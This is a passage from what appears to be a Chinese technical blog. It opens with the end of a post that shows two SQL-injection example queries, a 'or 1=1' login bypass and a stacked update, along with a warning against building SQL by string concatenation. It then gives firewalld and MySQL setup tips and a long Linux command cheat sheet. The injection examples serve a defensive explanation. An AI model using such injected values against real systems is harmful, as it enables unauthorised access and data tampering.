<p>select * from tb_user where username=’admin’ and password=’x’ or ‘1’=’1’</p>
<p>select * from tb_user where username=’admin’ and password=’‘; update … where ‘1’ = ‘1’</p>
<p># 向表中添加数据应避免用字符串拼接，防止SQL注射攻击。</p>
<h1 id="—-防火墙"><a href="#—-防火墙" class="headerlink" title="— 防火墙"></a>— 防火墙</h1><p>开启：systemctl start firewalld</p>
<p>添加80端口：firewall-cmd –add-port=80/tcp –permanent</p>
<p>重启：systemctl restart firewalld</p>
<p>firewalld和iptables</p>
<p>If you haven’t any real data in your database then clear all in /var/lib/mysql.</p>
<p>After that try again to run command mysql_install_db –user=mysql –basedir=/usr –datadir=/var/lib/mysql to initialize database directory.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" class="post-title-link" itemprop="url">linux常用命令大全</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-30 15:37:19" itemprop="dateModified" datetime="2022-08-30T15:37:19+08:00">2022-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="系统信息"><a href="#系统信息" class="headerlink" title="/系统信息"></a>/系统信息</h2><p>arch 显示机器的处理器架构</p>
<p>uname -m 显示机器的处理器架构</p>
<p>uname -r 显示正在使用的内核版本</p>
<p>dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) </p>
<p>hdparm -i /dev/hda 罗列一个磁盘的架构特性 </p>
<p>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 </p>
<p>cat /proc/cpuinfo 显示CPU info的信息</p>
<p>cat /proc/interrupts 显示中断 </p>
<p>cat /proc/meminfo 校验内存使用 </p>
<p>cat /proc/swaps 显示哪些swap被使用</p>
<p>cat /proc/version 显示内核的版本 </p>
<p>cat /proc/net/dev 显示网络适配器及统计 </p>
<p>cat /proc/mounts 显示已加载的文件系统 </p>
<p>lspci -tv 罗列 PCI 设备 </p>
<p>lsusb -tv 显示 USB 设备 </p>
<p>date 显示系统日期</p>
<p>cal 2007 显示2007年的日历表 </p>
<p>date 041217002007.00 设置日期和时间 - 月日时分年.秒 </p>
<p>clock -w 将时间修改保存到 BIOS </p>
<h1 id="关机-系统的关机、重启以及登出"><a href="#关机-系统的关机、重启以及登出" class="headerlink" title="关机 (系统的关机、重启以及登出 )"></a>关机 (系统的关机、重启以及登出 )</h1><p>shutdown -h now 关闭系统</p>
<p>init 0 关闭系统</p>
<p>telinit 0 关闭系统</p>
<p>shutdown -h hours:minutes &amp; 按预定时间关闭系统 </p>
<p>shutdown -c 取消按预定时间关闭系统</p>
<p>shutdown -r now 重启</p>
<p>reboot 重启</p>
<p>logout 注销</p>
<h1 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h1><p>cd /home 进入 ‘/ home’ 目录’ </p>
<p>cd .. 返回上一级目录</p>
<p>cd ../.. 返回上两级目录</p>
<p>cd 进入个人的主目录</p>
<p>cd ~user1 进入个人的主目录</p>
<p>cd - 返回上次所在的目录</p>
<p>pwd 显示工作路径</p>
<p>ls 查看目录中的文件</p>
<p>ls -F 查看目录中的文件</p>
<p>ls -l 显示文件和目录的详细资料</p>
<p>ls -a 显示隐藏文件</p>
<p>ls <em>[0-9]</em> 显示包含数字的文件名和目录名</p>
<p>tree 显示文件和目录由根目录开始的树形结构</p>
<p>lstree 显示文件和目录由根目录开始的树形结构</p>
<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’ </p>
<p>mkdir dir1 dir2 同时创建两个目录 </p>
<p>mkdir -p /tmp/dir1/dir2 创建一个目录树 </p>
<p>rm -f file1 删除一个叫做 ‘file1’ 的文件’ </p>
<p>rmdir dir1 删除一个叫做 ‘dir1’ 的目录’ </p>
<p>rm -rf dir1 删除一个叫做 ‘dir1’ 的目录并同时删除其内容</p>
<p>rm -rf dir1 dir2 同时删除两个目录及它们的内容 </p>
<p>mv dir1 new_dir 重命名/移动 一个目录 </p>
<p>cp file1 file2 复制一个文件 </p>
<p>cp dir/* . 复制一个目录下的所有文件到当前工作目录</p>
<p>cp -a /tmp/dir1 . 复制一个目录到当前工作目录 </p>
<p>cp -a dir1 dir2 复制一个目录 </p>
<p>cp -r dir1 dir2 复制一个目录及子目录</p>
<p>ln -s file1 lnk1 创建一个指向文件或目录的软链接 </p>
<p>ln file1 lnk1 创建一个指向文件或目录的物理链接 </p>
<p>touch -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) </p>
<p>file file1 outputs the mime type of the file as text </p>
<p>iconv -l 列出已知的编码</p>
<p>iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding. </p>
<p>find . -maxdepth 1 -name *.jpg -print -exec convert “{}” -resize 80x60 “thumbs/{}” ; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick) </p>
<h1 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h1><p>find / -name file1 从 ‘/‘ 开始进入根文件系统搜索文件和目录</p>
<p>find / -user user1 搜索属于用户 ‘user1’ 的文件和目录 </p>
<p>find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件</p>
<p>find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件</p>
<p>find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件</p>
<p>find / -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限 </p>
<p>find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备</p>
<p>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令 </p>
<p>whereis halt 显示一个二进制文件、源码或man的位置 </p>
<p>which halt 显示一个二进制文件或可执行文件的完整路径</p>
<h1 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a>挂载一个文件系统</h1><p>mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 ‘/ mnt/hda2’ 已经存在 </p>
<p>umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 ‘/ mnt/hda2’ 退出 </p>
<p>fuser -km /mnt/hda2 当设备繁忙时强制卸载 </p>
<p>umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用</p>
<p>mount /dev/fd0 /mnt/floppy 挂载一个软盘 </p>
<p>mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom </p>
<p>mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom </p>
<p>mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom </p>
<p>mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件</p>
<p>mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 </p>
<p>mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备</p>
<p>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 </p>
<h1 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a>磁盘空间</h1><p>df -h 显示已经挂载的分区列表</p>
<p>ls -lSr |more 以尺寸大小排列文件和目录 </p>
<p>du -sh dir1 估算目录 ‘dir1’ 已经使用的磁盘空间’ </p>
<p>du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </p>
<p>rpm -q -a –qf ‘%10{SIZE}t%{NAME}n’ | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) </p>
<p>dpkg-query -W -f=’${Installed-Size;10}t${Package}n’ | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) </p>
<h1 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h1><p>groupadd group_name 创建一个新用户组 </p>
<p>groupdel group_name 删除一个用户组 </p>
<p>groupmod -n new_group_name old_group_name 重命名一个用户组 </p>
<p>useradd -c “Name Surname “ -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 “admin” 用户组的用户 </p>
<p>useradd user1 创建一个新用户 </p>
<p>userdel -r user1 删除一个用户 ( ‘-r’ 排除主目录) </p>
<p>usermod -c “User FTP” -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性</p>
<p>passwd 修改口令</p>
<p>passwd user1 修改一个用户的口令 (只允许root执行) </p>
<p>chage -E 2005-12-31 user1 设置用户口令的失效期限 </p>
<p>pwck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的用户</p>
<p>grpck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的群组</p>
<p>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 </p>
<h1 id="文件的权限-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</h1><p>ls -lh 显示权限</p>
<p>ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示</p>
<p>chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 </p>
<p>chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限</p>
<p>chown user1 file1 改变一个文件的所有人属性 </p>
<p>chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 </p>
<p>chgrp group1 file1 改变文件的群组 </p>
<p>chown user1:group1 file1 改变一个文件的所有人和群组属性 </p>
<p>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 </p>
<p>chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</p>
<p>chmod u-s /bin/file1 禁用一个二进制文件的 SUID位 </p>
<p>chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</p>
<p>chmod g-s /home/public 禁用一个目录的 SGID 位 </p>
<p>chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</p>
<p>chmod o-t /home/public 禁用一个目录的 STIKY 位 </p>
<h1 id="文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</h1><p>chattr +a file1 只允许以追加方式读写文件 </p>
<p>chattr +c file1 允许这个文件能被内核自动压缩/解压 </p>
<p>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 </p>
<p>chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 </p>
<p>chattr +s file1 允许一个文件被安全地删除 </p>
<p>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 </p>
<p>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 </p>
<p>lsattr 显示特殊的属性</p>
<h1 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a>打包和压缩文件</h1><p>bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件 </p>
<p>bzip2 file1 压缩一个叫做 ‘file1’ 的文件 </p>
<p>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件 </p>
<p>gzip file1 压缩一个叫做 ‘file1’的文件 </p>
<p>gzip -9 file1 最大程度压缩 </p>
<p>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包 </p>
<p>rar a file1.rar file1 file2 dir1 同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’ </p>
<p>rar x file1.rar 解压rar包</p>
<p>unrar x file1.rar 解压rar包</p>
<p>tar -cvf archive.tar file1 创建一个非压缩的 tarball </p>
<p>tar -cvf archive.tar file1 file2 dir1 创建一个包含了 ‘file1’, ‘file2’ 以及 ‘dir1’的档案文件</p>
<p>tar -tf archive.tar 显示一个包中的内容 </p>
<p>tar -xvf archive.tar 释放一个包 </p>
<p>tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下</p>
<p>tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包</p>
<p>tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包</p>
<p>tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包</p>
<p>tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包</p>
<p>zip file1.zip file1 创建一个zip格式的压缩包</p>
<p>zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 </p>
<p>unzip file1.zip 解压一个zip格式压缩包</p>
<h1 id="扩展名-zst表示存档由zstd压缩。"><a href="#扩展名-zst表示存档由zstd压缩。" class="headerlink" title="扩展名.zst表示存档由zstd压缩。"></a>扩展名.zst表示存档由zstd压缩。</h1><p>tar命令有一个选项-I（ - use-compress-program）来指定压缩/解压缩命令。</p>
<p>可以按照如下命令进行解压：</p>
<p>$ tar -I zstd -xvf xxxx.tar.zst</p>
<p>参考文档：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/ask/172210/answer/274433">https://cloud.tencent.com/developer/ask/172210/answer/274433</a></p>
<p>但是在执行tar -I zstd -xvf xxxx.tar.zst过程中遇到了如下问题：</p>
<p>tar (child): zstd: Cannot exec: No such file or directory</p>
<p>tar (child): Error is not recoverable: exiting now</p>
<p>tar: Child returned status 2</p>
<p>tar: Error is not recoverable: exiting now</p>
<p>出现了这个是因为没有安装zstd包，需要手动安装这个安装包来解压zst</p>
<p>ubuntu 系统可以直接通过下面命令进行安装</p>
<p>$ sudo apt install zstd</p>
<p>参考文档：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/clairedandan/p/13830908.html">https://www.cnblogs.com/clairedandan/p/13830908.html</a></p>
<h1 id="RPM-包-（Fedora-Redhat及类似系统）"><a href="#RPM-包-（Fedora-Redhat及类似系统）" class="headerlink" title="RPM 包 - （Fedora, Redhat及类似系统）"></a>RPM 包 - （Fedora, Redhat及类似系统）</h1><p>rpm -ivh package.rpm 安装一个rpm包</p>
<p>rpm -ivh –nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告</p>
<p>rpm -U package.rpm 更新一个rpm包但不改变其配置文件</p>
<p>rpm -F package.rpm 更新一个确定已经安装的rpm包 </p>
<p>rpm -e package_name.rpm 删除一个rpm包</p>
<p>rpm -qa 显示系统中所有已经安装的rpm包 </p>
<p>rpm -qa | grep httpd 显示所有名称中包含 “httpd” 字样的rpm包</p>
<p>rpm -qi package_name 获取一个已安装包的特殊信息 </p>
<p>rpm -qg “System Environment/Daemons” 显示一个组件的rpm包 </p>
<p>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表</p>
<p>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表</p>
<p>rpm -q package_name –whatrequires 显示与一个rpm包存在依赖关系的列表</p>
<p>rpm -q package_name –whatprovides 显示一个rpm包所占的体积</p>
<p>rpm -q package_name –scripts 显示在安装/删除期间所执行的脚本l </p>
<p>rpm -q package_name –changelog 显示一个rpm包的修改历史</p>
<p>rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 </p>
<p>rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 </p>
<p>rpm –import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 </p>
<p>rpm –checksig package.rpm 确认一个rpm包的完整性</p>
<p>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性</p>
<p>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间</p>
<p>rpm -Va 检查系统中所有已安装的rpm包- 小心使用 </p>
<p>rpm -Vp package.rpm 确认一个rpm包还未安装</p>
<p>rpm2cpio package.rpm | cpio –extract –make-directories <em>bin</em> 从一个rpm包运行可执行文件</p>
<p>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm 从一个rpm源码安装一个构建好的包 </p>
<p>rpmbuild –rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 </p>
<h1 id="YUM-软件包升级器-（Fedora-RedHat及类似系统）"><a href="#YUM-软件包升级器-（Fedora-RedHat及类似系统）" class="headerlink" title="YUM 软件包升级器 - （Fedora, RedHat及类似系统）"></a>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</h1><p>yum install package_name 下载并安装一个rpm包</p>
<p>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</p>
<p>yum update package_name.rpm 更新当前系统中所有安装的rpm包 </p>
<p>yum update package_name 更新一个rpm包</p>
<p>yum remove package_name 删除一个rpm包</p>
<p>yum list 列出当前系统中安装的所有包</p>
<p>yum search package_name 在rpm仓库中搜寻软件包</p>
<p>yum clean packages 清理rpm缓存删除下载的包</p>
<p>yum clean headers 删除所有头文件 </p>
<p>yum clean all 删除所有缓存的包和头文件 </p>
<h1 id="DEB-包-Debian-Ubuntu-以及类似系统"><a href="#DEB-包-Debian-Ubuntu-以及类似系统" class="headerlink" title="DEB 包 (Debian, Ubuntu 以及类似系统)"></a>DEB 包 (Debian, Ubuntu 以及类似系统)</h1><p>dpkg -i package.deb 安装/更新一个 deb 包 </p>
<p>dpkg -r package_name 从系统删除一个 deb 包</p>
<p>dpkg -l 显示系统中所有已经安装的 deb 包 </p>
<p>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包</p>
<p>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 </p>
<p>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 </p>
<p>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表 </p>
<p>dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 </p>
<h1 id="APT-软件工具-Debian-Ubuntu-以及类似系统"><a href="#APT-软件工具-Debian-Ubuntu-以及类似系统" class="headerlink" title="APT 软件工具 (Debian, Ubuntu 以及类似系统)"></a>APT 软件工具 (Debian, Ubuntu 以及类似系统)</h1><p>apt-get install package_name 安装/更新一个 deb 包 </p>
<p>apt-cdrom install package_name 从光盘安装/更新一个 deb 包 </p>
<p>apt-get update 升级列表中的软件包 </p>
<p>apt-get upgrade 升级所有已安装的软件 </p>
<p>apt-get remove package_name 从系统删除一个deb包</p>
<p>apt-get check 确认依赖的软件仓库正确 </p>
<p>apt-get clean 从下载的软件包中清理缓存 </p>
<p>apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 </p>
<h1 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h1><p>cat file1 从第一个字节开始正向查看文件的内容</p>
<p>tac file1 从最后一行开始反向查看一个文件的内容</p>
<p>more file1 查看一个长文件的内容</p>
<p>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作</p>
<p>head -2 file1 查看一个文件的前两行 </p>
<p>tail -2 file1 查看一个文件的最后两行 </p>
<p>tail -f /var/log/messages 实时查看被添加到一个文件中的内容 </p>
<h1 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h1><p>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT </p>
<p>cat file1 | command( sed, grep, awk, grep, etc…) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中</p>
<p>cat file1 | command( sed, grep, awk, grep, etc…) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中</p>
<p>grep Aug /var/log/messages 在文件 ‘/var/log/messages’中查找关键词”Aug” </p>
<p>grep ^Aug /var/log/messages 在文件 ‘/var/log/messages’中查找以”Aug”开始的词汇 </p>
<p>grep [0-9] /var/log/messages 选择 ‘/var/log/messages’ 文件中所有包含数字的行 </p>
<p>grep Aug -R /var/log/* 在目录 ‘/var/log’ 及随后的目录中搜索字符串”Aug” </p>
<p>sed ‘s/stringa1/stringa2/g’ example.txt 将example.txt文件中的 “string1” 替换成 “string2” </p>
<p>sed ‘/^$/d’ example.txt 从example.txt文件中删除所有空白行</p>
<p>sed ‘/ *#/d; /^$/d’ example.txt 从example.txt文件中删除所有注释和空白行</p>
<p>echo ‘esempio’ | tr ‘[:lower:]’ ‘[:upper:]’ 合并上下单元格内容 </p>
<p>sed -e ‘1d’ result.txt 从文件example.txt 中排除第一行 </p>
<p>sed -n ‘/stringa1/p’ 查看只包含词汇 “string1”的行 </p>
<p>sed -e ‘s/ *$//‘ example.txt 删除每一行最后的空白字符 </p>
<p>sed -e ‘s/stringa1//g’ example.txt 从文档中只删除词汇 “string1” 并保留剩余全部 </p>
<p>sed -n ‘1,5p;5q’ example.txt 查看从第一行到第5行内容</p>
<p>sed -n ‘5p;5q’ example.txt 查看第5行</p>
<p>sed -e ‘s/00*/0/g’ example.txt 用单个零替换多个零 </p>
<p>cat -n file1 标示文件的行数</p>
<p>cat example.txt | awk ‘NR%2==1’ 删除example.txt文件中的所有偶数行 </p>
<p>echo a b c | awk ‘{print $1}’ 查看一行第一栏 </p>
<p>echo a b c | awk ‘{print $1,$3}’ 查看一行的第一和第三栏 </p>
<p>paste file1 file2 合并两个文件或两栏的内容 </p>
<p>paste -d ‘+’ file1 file2 合并两个文件或两栏的内容，中间用”+”区分 </p>
<p>sort file1 file2 排序两个文件的内容 </p>
<p>sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份) </p>
<p>sort file1 file2 | uniq -u 删除交集，留下其他的行 </p>
<p>sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) </p>
<p>comm -1 file1 file2 比较两个文件的内容只删除 ‘file1’ 所包含的内容 </p>
<p>comm -2 file1 file2 比较两个文件的内容只删除 ‘file2’ 所包含的内容 </p>
<p>comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 </p>
<h1 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a>字符设置和文件格式转换</h1><p>dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX </p>
<p>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS </p>
<p>recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html </p>
<p>recode -l | more 显示所有允许的转换格式 </p>
<h1 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h1><p>badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块</p>
<p>fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性</p>
<p>fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</p>
<p>e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</p>
<p>e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</p>
<p>fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</p>
<p>fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性</p>
<p>fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</p>
<p>dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</p>
<h1 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a>初始化一个文件系统</h1><p>mkfs /dev/hda1 在hda1分区创建一个文件系统</p>
<p>mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 </p>
<p>mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 </p>
<p>mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统</p>
<p>fdformat -n /dev/fd0 格式化一个软盘 </p>
<p>mkswap /dev/hda3 创建一个swap文件系统</p>
<h1 id="SWAP文件系统"><a href="#SWAP文件系统" class="headerlink" title="SWAP文件系统"></a>SWAP文件系统</h1><p>mkswap /dev/hda3 创建一个swap文件系统</p>
<p>swapon /dev/hda3 启用一个新的swap文件系统</p>
<p>swapon /dev/hda2 /dev/hdb3 启用两个swap分区</p>
<h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>dump -0aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的完整备份 </p>
<p>dump -1aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的交互式备份 </p>
<p>restore -if /tmp/home0.bak 还原一个交互式备份 </p>
<p>rsync -rogpav –delete /home /tmp 同步两边的目录 </p>
<p>rsync -rogpav -e ssh –delete /home ip_address:/tmp 通过SSH通道rsync </p>
<p>rsync -az -e ssh –delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录</p>
<p>rsync -az -e ssh –delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录</p>
<p>dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr ‘dd of=hda.gz’ 通过ssh在远程主机上执行一次备份本地磁盘的操作</p>
<p>dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 </p>
<p>tar -Puf backup.tar /home/user 执行一次对 ‘/home/user’ 目录的交互式备份操作 </p>
<p>( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr ‘cd /home/share/ &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个目录内容</p>
<p>( tar c /home ) | ssh -C user@ip_addr ‘cd /home/backup-home &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个本地目录</p>
<p>tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 </p>
<p>find /home/user1 -name ‘*.txt’ | xargs cp -av –target-directory=/home/backup/ –parents 从一个目录查找并复制所有以 ‘.txt’ 结尾的文件到另一个目录</p>
<p>find /var/log -name ‘*.log’ | tar cv –files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 ‘.log’ 结尾的文件并做成一个bzip包 </p>
<p>dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 </p>
<p>dd if=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 </p>
<h1 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h1><p>cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容</p>
<p>mkisofs /dev/cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件 </p>
<p>mkisofs /dev/cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件 </p>
<p>mkisofs -J -allow-leading-dots -R -V “Label CD” -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件</p>
<p>cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件</p>
<p>gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom - 刻录一个压缩了的ISO镜像文件 </p>
<p>mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件</p>
<p>cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中 </p>
<p>cd-paranoia – “-3” 从一个CD光盘转录音轨到 wav 文件中（参数-3） </p>
<p>cdrecord –scanbus 扫描总线以识别scsi通道</p>
<p>dd if=/dev/hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD </p>
<h1 id="网络-（以太网和WIFI无线）"><a href="#网络-（以太网和WIFI无线）" class="headerlink" title="网络 - （以太网和WIFI无线）"></a>网络 - （以太网和WIFI无线）</h1><p>ifconfig eth0 显示一个以太网卡的配置 </p>
<p>ifup eth0 启用一个 ‘eth0’ 网络设备 </p>
<p>ifdown eth0 禁用一个 ‘eth0’ 网络设备 </p>
<p>ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址 </p>
<p>ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing) </p>
